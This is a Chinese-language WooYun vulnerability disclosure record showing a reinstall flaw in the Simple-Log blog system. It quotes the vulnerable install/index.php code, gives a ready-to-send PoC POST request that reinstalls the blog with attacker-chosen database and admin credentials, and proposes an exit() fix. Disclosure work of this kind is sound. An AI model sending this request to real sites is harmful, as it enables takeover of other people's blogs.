{"id": 13114, "wybug_id": "wooyun-2013-020227", "wybug_title": "Simple-Log博客系统全版本重安装漏洞", "wybug_corp": "Simple-Log", "wybug_author": "猪头子", "wybug_date": "2013-03-18 13:21", "wybug_open_date": "2013-05-02 13:21", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "逻辑错误", "未删除服务器", "用文件", "未删除"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-18：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-05-02：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： Simple-Log博客系统是PHP+MySQL构建的博客系统,若install目录未删除的话，将导致攻击者可以重新安装 详细说明：  在没有删除install文件夹的情况下，install/index.php中用户可以提交远程mysql账号和密码，导致simple-log会重新安装，由于header()函数并不会结束之后的代码，因此漏洞出现。\n在/install/index.php          $setup=! empty($_POST['setup' ])?$_POST['setup']: 'check';     if (file_exists(PBBLOG_ROOT.'home/data/config.php' ))     {            require_once(PBBLOG_ROOT.'home/data/config.php' );     }     //用户只要以 post方式提交setup=finish就可进入安装流程     if ($install_lock&& $setup!='finish')     {           //header头并不会结束之后的代码，漏洞出在这里           header( 'location: ../index.php');     }     ... ... ...     ... ... ...     elseif ($setup=='finish' )     {      $error= array();      if (empty ($_POST['host']))      {            $error[]= '请填写数据库地址' ;      }      if (empty ($_POST['dbname']))      {            $error[]= '请填写数据库' ;      }      if (empty ($_POST['dbuser']))      {            $error[]= '请填写数据库用户名' ;      }      if (empty ($_POST['admin_user']))      {            $error[]= '请填写管理员账号' ;      }      if (empty ($_POST['admin_pass']))      {            $error[]= '请填写管理员密码' ;      }      if (empty ($_POST['blogname']))      {            $error[]= '请填写博客名字' ;      }      if ($error)      {            echo '<p class=\"line\">错误信息</p>';            foreach ($error as $val)            {                   echo \"<p>$val </p>\";            }             exit;      }           //这里填写自己mysql数据库的连接信息      $dbhost=$_POST[ 'host'];      $dbuser=$_POST[ 'dbuser'];      $dbpw=$_POST[ 'dbpass'];      $dbname=$_POST[ 'dbname'];      $charset   = 'utf8';      $db= new cls_mysql();      if ($db->connect($dbhost,$dbuser,$dbpw,$dbname,$charset, $pconnect))      {            $error[]= '数据库连接错误' ;      }      if (empty ($_POST['dbprefix']))      {             $dbprefix='fb_';      }      else      {             $dbprefix=$_POST['dbprefix'];      }      //提交的admin_user和admin_pass最后将成为web管理员的账号和密码      $admin_user=$_POST[ 'admin_user'];      $admin_pass=$_POST[ 'admin_pass'];      $blogname=$_POST[ 'blogname'];      $blogdesc=$_POST[ 'blogdesc'];      $blog_keyword=$_POST[ 'blogkeyword'];      //之后就写入配置文件和更新数据库，再以后这个simple-log的数据库将使用用户提交的数据库\n   漏洞证明：  PoC:\nPOST http://xxx/install/index.php HTTP/1.1User-Agent: Opera/9.80 (Windows NT 6.1; WOW64; U; Edition IBIS; zh-cn) Presto/2.10.229 Version/11.64Host: www.xxx.comAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1Accept-Language: zh-CN,zh;q=0.9,en;q=0.8Accept-Encoding: gzip, deflateReferer: http://xxx/install/index.phpProxy-Connection: Keep-AliveContent-Length: 118Content-Type: application/x-www-form-urlencodedsetup=finish&host=mysql的地址&dbname=数据库名&dbuser=帐号&dbpass=密码&admin_user=管理员帐号&admin_pass=管理员密码&blogname=博客名\n\n\n   修复方案：  在header()后加上exit()\nif ($install_lock&& $setup!='finish'){     header( 'location: ../index.php');     exit();}\n   版权声明：转载请注明来源 猪头子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：5 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 5, "Ranks": null}